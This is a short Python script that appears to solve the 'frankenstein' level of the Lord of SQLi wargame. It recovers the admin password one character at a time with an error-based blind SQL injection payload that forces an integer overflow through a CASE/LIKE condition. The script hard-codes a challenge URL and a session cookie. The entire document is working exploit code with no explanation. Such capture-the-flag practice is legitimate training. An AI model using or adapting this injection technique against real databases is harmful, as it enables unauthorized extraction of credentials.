# LordofSQLi: frankenstein
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'
cookies = {'PHPSESSID': 'e039r2heplar8079kk3tq79r14'}
passwd = ''

finish = False
while not finish:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'pw': f"' || case when id='admin' and pw like '{passwd + c}%' then ~0*2 end#"}
        r = requests.get(url, params=payload, cookies=cookies)

        print(c, end='', flush=True)
        if not 'php' in r.text:
            passwd += c
            print('\n->' + passwd)
            finish = False
            break

print('\n->' + passwd)
